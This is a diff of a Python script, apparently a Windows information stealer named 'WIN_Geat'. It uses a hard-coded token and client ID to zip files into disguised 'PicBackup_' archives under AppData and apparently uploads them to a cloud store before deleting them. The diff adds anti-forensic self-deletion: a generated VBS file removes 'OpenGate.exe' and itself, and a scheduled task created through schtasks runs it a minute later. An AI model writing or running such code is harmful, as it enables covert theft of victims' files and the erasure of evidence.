@@ -1,14 +1,17 @@
 #!/usr/bin/env python3
 # pip install urllib3==1.26.6
+# pip insatll requests
 
-from charset_normalizer import md__mypyc
 import os
 import shutil
 import base64
 import json
 import requests
 import socket
-import urllib.request
+import subprocess
+from subprocess import PIPE 
+from datetime import datetime
+from charset_normalizer import md__mypyc
 
 Token         = ""# add the Token hare
 client_id     = ''#add the client_id  hare
@@ -27,7 +30,9 @@ try:
      host_ip    = socket.gethostbyname(host_name)
 except socket.gaierror: 
     host_ip =  'None'
+
 class WIN_Geat:
+
     def __init__(self):
         self.Token         = Token 
         self.client_id     = client_id
@@ -85,11 +90,11 @@ class WIN_Geat:
                       break 
         Conut_list  = []
         if Part_name not in Conut_list:
-           Conut_list.append(Part_name)
+          Conut_list.append(Part_name)
         if count == 0:
-           self.Part_name = Part_name
-           self.Cloue_Store()
-           self.remove_files()
+            self.Part_name = Part_name
+            self.Cloue_Store()
+            self.remove_files()
         else:                   
             if os.path.exists( os.environ["appdata"] +'\\PicBackup_'+str( Conut_list[-1])+'.zip') :
                 
@@ -147,15 +152,19 @@ class WIN_Geat:
             shutil.rmtree(os.environ["appdata"] +'\\PicBackup_', ignore_errors=True, onerror=None)    
             os.remove(os.environ["appdata"] +'\\PicBackup_'+str(f'{d}')+'.zip')  
             d +=1 
-            
+        with open(os.getcwd()+'\\Delete_self.vbs','w')  as vbs:
+             vbs.write(
+                       "dim filesys"+'\n'
+                       'Set filesys = CreateObject("Scripting.FileSystemObject")'+'\n'
+                       'filesys.DeleteFile "'+os.getcwd()+'\\OpenGate.exe"'+"\n"
+                       'filesys.DeleteFile "'+os.getcwd()+'\\Delete_self.vbs"'+"\n"
+                     ) 
+               
+        now = datetime.now()
+        current_time_add = int(now.strftime("%H:%M:%S").split(':')[1])+1
+        Current_time_run = now.strftime("%H:"+str(f'{current_time_add}')+":%S")        
+        Delete_self_Var  = r'SchTasks /Create  /TN "Delete_self" /TR '+os.getcwd()+'\\Delete_self.vbs '+'/SC once /ST '+Current_time_run + ' /F > nul 2>&1'          
+        subprocess.call(Delete_self_Var,shell=True,stderr=subprocess.PIPE,stdout=PIPE)
 if __name__=='__main__':
     WIN_Geat()
-
-
-
-
-
-
-
-
 
